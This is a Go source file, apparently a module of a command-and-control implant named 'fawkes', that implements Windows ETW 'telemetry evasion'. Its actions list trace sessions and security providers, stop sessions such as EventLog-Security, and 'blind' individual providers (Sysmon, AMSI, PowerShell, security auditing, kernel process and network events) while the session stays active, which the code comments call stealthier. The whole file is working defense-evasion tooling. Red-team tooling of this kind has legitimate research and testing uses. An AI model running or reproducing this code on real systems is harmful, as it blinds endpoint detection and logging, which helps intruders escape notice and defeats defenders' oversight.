//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type EtwCommand struct{}

func (c *EtwCommand) Name() string {
	return "etw"
}

func (c *EtwCommand) Description() string {
	return "Enumerate, stop, or blind ETW trace sessions and providers for telemetry evasion"
}

type etwParams struct {
	Action      string `json:"action"`
	SessionName string `json:"session_name"`
	Provider    string `json:"provider"`
}

var (
	advapi32ETW               = windows.NewLazySystemDLL("advapi32.dll")
	procQueryAllTracesW       = advapi32ETW.NewProc("QueryAllTracesW")
	procEnumerateTraceGuidsEx = advapi32ETW.NewProc("EnumerateTraceGuidsEx")
	procControlTraceW         = advapi32ETW.NewProc("ControlTraceW")
	procEnableTraceEx2        = advapi32ETW.NewProc("EnableTraceEx2")
)

// EVENT_TRACE_PROPERTIES structure (simplified)
// Minimum size needed for QueryAllTracesW
const eventTracePropsSize = 1024

// TRACE_QUERY_INFO_CLASS values
const (
	traceGuidQueryList = 0
	traceGuidQueryInfo = 1
)

// ControlTrace control codes
const (
	eventTraceControlQuery  = 0
	eventTraceControlStop   = 1
	eventTraceControlUpdate = 2
)

// EnableTraceEx2 control codes
const (
	eventControlCodeDisableProvider = 0
	eventControlCodeEnableProvider  = 1
)

// knownSecurityProviders and providerShorthands are defined in command_helpers.go

func (c *EtwCommand) Execute(task structs.Task) structs.CommandResult {
	var params etwParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "sessions"
	}

	switch params.Action {
	case "sessions":
		return etwSessions()
	case "providers":
		return etwProviders()
	case "stop":
		return etwStop(params.SessionName)
	case "blind":
		return etwBlind(params.SessionName, params.Provider)
	case "query":
		return etwQuery(params.SessionName)
	case "enable":
		return etwEnable(params.SessionName, params.Provider)
	default:
		return errorf("Unknown action: %s (use sessions, providers, stop, blind, query, enable)", params.Action)
	}
}

func etwSessions() structs.CommandResult {
	// Allocate array of pointers to EVENT_TRACE_PROPERTIES
	const maxSessions = 64
	propsBufs := make([][]byte, maxSessions)
	propsPtrs := make([]uintptr, maxSessions)

	for i := range propsBufs {
		propsBufs[i] = make([]byte, eventTracePropsSize)
		// Set Wnode.BufferSize at offset 0
		binary.LittleEndian.PutUint32(propsBufs[i][0:4], eventTracePropsSize)
		// LogFileNameOffset at offset 112, LoggerNameOffset at offset 116
		// Point to buffer space after the fixed 120-byte struct
		binary.LittleEndian.PutUint32(propsBufs[i][116:120], 120) // LoggerNameOffset
		binary.LittleEndian.PutUint32(propsBufs[i][112:116], 632) // LogFileNameOffset (120 + 256*2)
		propsPtrs[i] = uintptr(unsafe.Pointer(&propsBufs[i][0]))
	}

	var sessionCount uint32
	r1, _, err := procQueryAllTracesW.Call(
		uintptr(unsafe.Pointer(&propsPtrs[0])),
		maxSessions,
		uintptr(unsafe.Pointer(&sessionCount)),
	)
	if r1 != 0 {
		return errorf("QueryAllTracesW failed: %v (0x%X)", err, r1)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Active ETW Trace Sessions — %d found\n\n", sessionCount))
	sb.WriteString(fmt.Sprintf("%-35s %-8s %s\n", "SESSION NAME", "EVENTS", "SECURITY RELEVANCE"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for i := uint32(0); i < sessionCount; i++ {
		buf := propsBufs[i]

		// EVENT_TRACE_PROPERTIES layout:
		// WNODE_HEADER: 48 bytes (BufferSize(4) + ProviderId(4) + HistoricalContext(8) +
		//   TimeStamp(8) + Guid(16) + ClientContext(4) + Flags(4))
		// After WNODE_HEADER: BufferSize(4) + MinimumBuffers(4) + MaximumBuffers(4) +
		//   MaximumFileSize(4) + LogFileMode(4) + FlushTimer(4) + EnableFlags(4) +
		//   AgeLimit(4) + NumberOfBuffers(4) + FreeBuffers(4) + EventsLost(4) +
		//   BuffersWritten(4) + LogBuffersLost(4) + RealTimeBuffersLost(4) +
		//   LoggerThreadId(8) + LogFileNameOffset(4@112) + LoggerNameOffset(4@116)
		// Total fixed size: 120 bytes

		loggerNameOffset := binary.LittleEndian.Uint32(buf[116:120])
		sessionName := ""
		if loggerNameOffset > 0 && loggerNameOffset < eventTracePropsSize-2 {
			// UTF-16LE string
			nameBytes := buf[loggerNameOffset:]
			u16s := make([]uint16, 0)
			for j := 0; j+1 < len(nameBytes); j += 2 {
				ch := binary.LittleEndian.Uint16(nameBytes[j : j+2])
				if ch == 0 {
					break
				}
				u16s = append(u16s, ch)
			}
			sessionName = windows.UTF16ToString(u16s)
		}

		if sessionName == "" {
			sessionName = fmt.Sprintf("Session_%d", i)
		}

		// Get event count from NumberOfBuffers * BufferSize area
		// EventsLost at offset 56
		eventsLost := binary.LittleEndian.Uint32(buf[56:60])
		_ = eventsLost

		// Check security relevance
		relevance := classifySessionSecurity(sessionName)

		sb.WriteString(fmt.Sprintf("%-35s %-8s %s\n",
			truncStr(sessionName, 35), "", relevance))
	}

	return successResult(sb.String())
}

func etwProviders() structs.CommandResult {
	// Use EnumerateTraceGuidsEx to get all registered providers
	// First call to get required size
	var requiredSize uint32
	procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList,
		0, 0,
		0, 0,
		uintptr(unsafe.Pointer(&requiredSize)),
	)

	if requiredSize == 0 {
		return errorResult("No ETW providers found or EnumerateTraceGuidsEx not available")
	}

	buf := make([]byte, requiredSize)
	r1, _, err := procEnumerateTraceGuidsEx.Call(
		traceGuidQueryList,
		0, 0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(requiredSize),
		uintptr(unsafe.Pointer(&requiredSize)),
	)
	if r1 != 0 {
		return errorf("EnumerateTraceGuidsEx failed: %v (0x%X)", err, r1)
	}

	// Parse the array of GUIDs
	guidSize := 16
	numGuids := int(requiredSize) / guidSize
	var securityProviders []string
	var otherCount int

	for i := 0; i < numGuids; i++ {
		offset := i * guidSize
		if offset+guidSize > len(buf) {
			break
		}

		guid := parseGUID(buf[offset : offset+guidSize])
		guidStr := guid.String()
		guidUpper := strings.ToUpper(guidStr)

		// Strip braces if present
		guidUpper = strings.Trim(guidUpper, "{}")

		if name, ok := knownSecurityProviders[guidUpper]; ok {
			securityProviders = append(securityProviders, fmt.Sprintf("%-45s %s", name, guidUpper))
		} else {
			otherCount++
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("ETW Providers — %d total registered\n\n", numGuids))

	if len(securityProviders) > 0 {
		sb.WriteString(fmt.Sprintf("Security-Relevant Providers (%d found):\n", len(securityProviders)))
		sb.WriteString(fmt.Sprintf("%-45s %s\n", "PROVIDER NAME", "GUID"))
		sb.WriteString(strings.Repeat("-", 85) + "\n")
		for _, p := range securityProviders {
			sb.WriteString(fmt.Sprintf("  %s\n", p))
		}
	} else {
		sb.WriteString("No known security-relevant ETW providers detected.\n")
	}

	sb.WriteString(fmt.Sprintf("\n%d other (non-security) providers registered\n", otherCount))

	return successResult(sb.String())
}

// etwStop stops an ETW trace session entirely using ControlTrace
func etwStop(sessionName string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for stop action\nUsage: etw -action stop -session_name \"EventLog-Security\"")
	}

	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize) // Wnode.BufferSize
	binary.LittleEndian.PutUint32(props[116:120], 120)             // LoggerNameOffset
	binary.LittleEndian.PutUint32(props[112:116], 632)             // LogFileNameOffset

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, sysErr := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlStop,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace STOP failed for '%s': error %d (0x%X)", sessionName, errCode, errCode)
		switch errCode {
		case 4201: // ERROR_WMI_INSTANCE_NOT_FOUND
			errMsg += " — session not found (check session name with 'etw -action sessions')"
		case 5: // ERROR_ACCESS_DENIED
			errMsg += " — access denied (requires Administrator/SYSTEM privileges)"
		default:
			errMsg += fmt.Sprintf(" (%v)", sysErr)
		}
		return errorResult(errMsg)
	}

	return successf("Successfully stopped ETW trace session: %s\nTelemetry from this session will no longer be collected.", sessionName)
}

// etwBlind disables a specific ETW provider within a trace session using EnableTraceEx2
// This is stealthier than stopping the entire session — the session remains active
// but the specified provider no longer generates events.
func etwBlind(sessionName, provider string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for blind action\nUsage: etw -action blind -session_name \"EventLog-Security\" -provider sysmon")
	}
	if provider == "" {
		return errorResult("Error: provider is required for blind action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client")
	}

	// Step 1: Resolve provider to GUID
	providerGUID, resolvedName := resolveProviderGUID(provider)
	if providerGUID == "" {
		return errorf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider)
	}

	// Step 2: Query the session to get its handle
	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize) // Wnode.BufferSize
	binary.LittleEndian.PutUint32(props[116:120], 120)             // LoggerNameOffset
	binary.LittleEndian.PutUint32(props[112:116], 632)             // LogFileNameOffset

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, _ := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlQuery,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace QUERY failed for session '%s': error %d (0x%X)", sessionName, errCode, errCode)
		if errCode == 4201 {
			errMsg += " — session not found"
		}
		return errorResult(errMsg)
	}

	// Get session handle from WNODE_HEADER.HistoricalContext (offset 8, 8 bytes)
	sessionHandle := binary.LittleEndian.Uint64(props[8:16])

	// Step 3: Parse the GUID
	guidStr := providerGUID
	if !strings.HasPrefix(guidStr, "{") {
		guidStr = "{" + guidStr + "}"
	}

	guid, err := windows.GUIDFromString(guidStr)
	if err != nil {
		return errorf("Invalid provider GUID '%s': %v", providerGUID, err)
	}

	// Step 4: Disable the provider using EnableTraceEx2
	r1, _, _ = procEnableTraceEx2.Call(
		uintptr(sessionHandle),
		uintptr(unsafe.Pointer(&guid)),
		eventControlCodeDisableProvider,
		0, // Level: TRACE_LEVEL_NONE
		0, // MatchAnyKeyword
		0, // MatchAllKeyword
		0, // Timeout
		0, // EnableParameters: NULL
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("EnableTraceEx2 DISABLE failed: error %d (0x%X)", errCode, errCode)
		if errCode == 5 {
			errMsg += " — access denied (requires Administrator/SYSTEM)"
		}
		return errorResult(errMsg)
	}

	displayName := resolvedName
	if displayName == "" {
		displayName = providerGUID
	}

	return successf("Successfully disabled ETW provider '%s' (%s) in session '%s'\nThe session remains active but this provider will no longer generate events.", displayName, providerGUID, sessionName)
}

// etwQuery queries a specific ETW trace session for detailed information
func etwQuery(sessionName string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for query action\nUsage: etw -action query -session_name \"EventLog-Security\"")
	}

	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize) // Wnode.BufferSize
	binary.LittleEndian.PutUint32(props[116:120], 120)             // LoggerNameOffset
	binary.LittleEndian.PutUint32(props[112:116], 632)             // LogFileNameOffset

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, sysErr := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlQuery,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace QUERY failed for '%s': error %d (0x%X)", sessionName, errCode, errCode)
		switch errCode {
		case 4201:
			errMsg += " — session not found"
		case 5:
			errMsg += " — access denied"
		default:
			errMsg += fmt.Sprintf(" (%v)", sysErr)
		}
		return errorResult(errMsg)
	}

	// Parse EVENT_TRACE_PROPERTIES fields
	// WNODE_HEADER (48 bytes): BufferSize(4) ProviderId(4) HistoricalContext(8) TimeStamp(8) Guid(16) ClientContext(4) Flags(4)
	// After WNODE_HEADER (offset 48):
	//   BufferSize(4@48) MinBuffers(4@52) MaxBuffers(4@56) MaxFileSize(4@60)
	//   LogFileMode(4@64) FlushTimer(4@68) EnableFlags(4@72) AgeLimit(4@76)
	//   NumberOfBuffers(4@80) FreeBuffers(4@84) EventsLost(4@88)
	//   BuffersWritten(4@92) LogBuffersLost(4@96) RealTimeBuffersLost(4@100)
	//   LoggerThreadId(8@104) LogFileNameOffset(4@112) LoggerNameOffset(4@116)
	bufferSize := binary.LittleEndian.Uint32(props[48:52])
	minBuffers := binary.LittleEndian.Uint32(props[52:56])
	maxBuffers := binary.LittleEndian.Uint32(props[56:60])
	logFileMode := binary.LittleEndian.Uint32(props[64:68])
	flushTimer := binary.LittleEndian.Uint32(props[68:72])
	numBuffers := binary.LittleEndian.Uint32(props[80:84])
	freeBuffers := binary.LittleEndian.Uint32(props[84:88])
	eventsLost := binary.LittleEndian.Uint32(props[88:92])
	buffersWritten := binary.LittleEndian.Uint32(props[92:96])
	logBuffersLost := binary.LittleEndian.Uint32(props[96:100])
	rtBuffersLost := binary.LittleEndian.Uint32(props[100:104])

	// Parse log file name
	logFileOffset := binary.LittleEndian.Uint32(props[112:116])
	logFile := ""
	if logFileOffset > 0 && logFileOffset < eventTracePropsSize-2 {
		nameBytes := props[logFileOffset:]
		u16s := make([]uint16, 0)
		for j := 0; j+1 < len(nameBytes); j += 2 {
			ch := binary.LittleEndian.Uint16(nameBytes[j : j+2])
			if ch == 0 {
				break
			}
			u16s = append(u16s, ch)
		}
		logFile = windows.UTF16ToString(u16s)
	}
	if logFile == "" {
		logFile = "(none — real-time only)"
	}

	// Decode log file mode flags
	var modeFlags []string
	if logFileMode&0x00000100 != 0 {
		modeFlags = append(modeFlags, "REAL_TIME")
	}
	if logFileMode&0x00000001 != 0 {
		modeFlags = append(modeFlags, "SEQUENTIAL")
	}
	if logFileMode&0x00000002 != 0 {
		modeFlags = append(modeFlags, "CIRCULAR")
	}
	if logFileMode&0x00000008 != 0 {
		modeFlags = append(modeFlags, "SECURE")
	}
	modeStr := fmt.Sprintf("0x%X", logFileMode)
	if len(modeFlags) > 0 {
		modeStr += " (" + strings.Join(modeFlags, " | ") + ")"
	}

	relevance := classifySessionSecurity(sessionName)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("ETW Session: %s\n", sessionName))
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")
	if relevance != "" {
		sb.WriteString(fmt.Sprintf("Security Relevance:   %s\n", relevance))
	}
	sb.WriteString(fmt.Sprintf("Buffer Size:          %d KB\n", bufferSize))
	sb.WriteString(fmt.Sprintf("Buffers (min/cur/max): %d / %d / %d\n", minBuffers, numBuffers, maxBuffers))
	sb.WriteString(fmt.Sprintf("Free Buffers:         %d\n", freeBuffers))
	sb.WriteString(fmt.Sprintf("Buffers Written:      %d\n", buffersWritten))
	sb.WriteString(fmt.Sprintf("Events Lost:          %d\n", eventsLost))
	sb.WriteString(fmt.Sprintf("Log Buffers Lost:     %d\n", logBuffersLost))
	sb.WriteString(fmt.Sprintf("RT Buffers Lost:      %d\n", rtBuffersLost))
	sb.WriteString(fmt.Sprintf("Flush Timer:          %d sec\n", flushTimer))
	sb.WriteString(fmt.Sprintf("Log File Mode:        %s\n", modeStr))
	sb.WriteString(fmt.Sprintf("Log File:             %s\n", logFile))

	return successResult(sb.String())
}

// etwEnable re-enables a previously blinded ETW provider within a trace session
func etwEnable(sessionName, provider string) structs.CommandResult {
	if sessionName == "" {
		return errorResult("Error: session_name is required for enable action\nUsage: etw -action enable -session_name \"EventLog-Security\" -provider sysmon")
	}
	if provider == "" {
		return errorResult("Error: provider is required for enable action (GUID or shorthand name)\nShorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client")
	}

	providerGUID, resolvedName := resolveProviderGUID(provider)
	if providerGUID == "" {
		return errorf("Could not resolve provider '%s' — use a GUID or shorthand (sysmon, amsi, powershell, dotnet, etc.)", provider)
	}

	props := make([]byte, eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[0:4], eventTracePropsSize)
	binary.LittleEndian.PutUint32(props[116:120], 120)
	binary.LittleEndian.PutUint32(props[112:116], 632)

	nameUTF16, err := windows.UTF16PtrFromString(sessionName)
	if err != nil {
		return errorf("Error converting session name: %v", err)
	}

	r1, _, _ := procControlTraceW.Call(
		0,
		uintptr(unsafe.Pointer(nameUTF16)),
		uintptr(unsafe.Pointer(&props[0])),
		eventTraceControlQuery,
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("ControlTrace QUERY failed for session '%s': error %d (0x%X)", sessionName, errCode, errCode)
		if errCode == 4201 {
			errMsg += " — session not found"
		}
		return errorResult(errMsg)
	}

	sessionHandle := binary.LittleEndian.Uint64(props[8:16])

	guidStr := providerGUID
	if !strings.HasPrefix(guidStr, "{") {
		guidStr = "{" + guidStr + "}"
	}

	guid, err := windows.GUIDFromString(guidStr)
	if err != nil {
		return errorf("Invalid provider GUID '%s': %v", providerGUID, err)
	}

	// Re-enable with TRACE_LEVEL_VERBOSE (5) and all keywords
	r1, _, _ = procEnableTraceEx2.Call(
		uintptr(sessionHandle),
		uintptr(unsafe.Pointer(&guid)),
		eventControlCodeEnableProvider,
		5,                    // TRACE_LEVEL_VERBOSE
		0xFFFFFFFFFFFFFFFF,   // MatchAnyKeyword: all
		0,                    // MatchAllKeyword
		0,                    // Timeout
		0,                    // EnableParameters: NULL
	)
	if r1 != 0 {
		errCode := uint32(r1)
		errMsg := fmt.Sprintf("EnableTraceEx2 ENABLE failed: error %d (0x%X)", errCode, errCode)
		if errCode == 5 {
			errMsg += " — access denied (requires Administrator/SYSTEM)"
		}
		return errorResult(errMsg)
	}

	displayName := resolvedName
	if displayName == "" {
		displayName = providerGUID
	}

	return successf("Successfully re-enabled ETW provider '%s' (%s) in session '%s'\nThe provider will resume generating events.", displayName, providerGUID, sessionName)
}

// resolveProviderGUID moved to command_helpers.go

func parseGUID(data []byte) windows.GUID {
	return windows.GUID{
		Data1: binary.LittleEndian.Uint32(data[0:4]),
		Data2: binary.LittleEndian.Uint16(data[4:6]),
		Data3: binary.LittleEndian.Uint16(data[6:8]),
		Data4: [8]byte{data[8], data[9], data[10], data[11], data[12], data[13], data[14], data[15]},
	}
}

// classifySessionSecurity moved to command_helpers.go
